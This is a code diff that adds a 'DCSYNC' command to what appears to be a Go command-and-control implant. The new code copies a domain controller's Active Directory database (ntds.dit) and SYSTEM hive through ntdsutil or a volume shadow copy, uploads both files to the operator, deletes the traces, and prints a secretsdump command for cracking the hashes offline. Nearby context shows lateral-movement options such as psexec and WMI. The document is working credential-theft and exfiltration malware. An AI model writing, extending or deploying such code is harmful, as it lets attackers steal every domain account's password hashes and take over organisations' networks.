@@ -1471,6 +1471,67 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("[+] ntds.dit dump to %s\n%s", outDir, out), errStr)
 
+	case "DCSYNC":
+		// Extract ntds.dit + SYSTEM hive via IFM (default) or VSS, upload both files.
+		// Args JSON: {"mode":"ifm|vss","out":"C:\\Users\\Public\\dcsync_out"}
+		// Offline parsing: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+		var dca struct {
+			Mode string `json:"mode"`
+			Out  string `json:"out"`
+		}
+		dca.Mode = "ifm"
+		dca.Out = `C:\Users\Public\dcsync_out`
+		json.Unmarshal([]byte(task.Args), &dca)
+		tmpDir := dca.Out
+
+		var dcErr string
+		if dca.Mode == "vss" {
+			// VSS shadow copy approach
+			vssOut, _ := runShell(`vssadmin create shadow /for=C: 2>&1`)
+			shadowPath := ""
+			for _, line := range strings.Split(vssOut, "\n") {
+				if strings.Contains(line, "HarddiskVolumeShadowCopy") && strings.Contains(line, "\\\\?\\") {
+					parts := strings.Fields(strings.TrimSpace(line))
+					if len(parts) > 0 {
+						shadowPath = strings.Trim(parts[len(parts)-1], "\r")
+						break
+					}
+				}
+			}
+			if shadowPath == "" {
+				dcErr = "VSS shadow copy failed: " + vssOut
+			} else {
+				runShell(fmt.Sprintf(`mkdir "%s" 2>&1`, tmpDir))
+				runShell(fmt.Sprintf(`copy "%s\\Windows\\NTDS\\ntds.dit" "%s\\ntds.dit" /Y 2>&1`, shadowPath, tmpDir))
+				runShell(fmt.Sprintf(`copy "%s\\Windows\\System32\\config\\SYSTEM" "%s\\SYSTEM" /Y 2>&1`, shadowPath, tmpDir))
+			}
+		} else {
+			// IFM: ntdsutil create full snapshot
+			runShell(fmt.Sprintf(`rmdir /S /Q "%s" 2>&1`, tmpDir))
+			ifmOut, _ := runShell(fmt.Sprintf(`ntdsutil "ac i ntds" "ifm" "create full %s" q q 2>&1`, tmpDir))
+			_ = ifmOut
+		}
+
+		if dcErr == "" {
+			ntdsPath := tmpDir + `\Active Directory\ntds.dit`
+			sysPath := tmpDir + `\registry\SYSTEM`
+			if dca.Mode == "vss" {
+				ntdsPath = tmpDir + `\ntds.dit`
+				sysPath = tmpDir + `\SYSTEM`
+			}
+			for _, fp := range [][2]string{{ntdsPath, "ntds.dit"}, {sysPath, "SYSTEM"}} {
+				if data, err2 := os.ReadFile(fp[0]); err2 == nil {
+					t.uploadFile(task.ID, fp[1], data)
+				} else {
+					dcErr += fmt.Sprintf("read %s: %v; ", fp[0], err2)
+				}
+			}
+			runShell(fmt.Sprintf(`rmdir /S /Q "%s" 2>&1`, tmpDir))
+			t.sendResult(task.ID, "[+] DCSYNC: ntds.dit + SYSTEM uploaded. Run: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL", dcErr)
+		} else {
+			t.sendResult(task.ID, "", dcErr)
+		}
+
 	// ── Lateral movement ──────────────────────────────────────────────────────
 	// Args JSON: {"method":"psexec|wmi|winrm|ssh|dcom","host":"<ip>","payload":"<file>",
 	//             "svcname":"<opt>","user":"<opt DOMAIN\\user>","pass":"<opt>"}
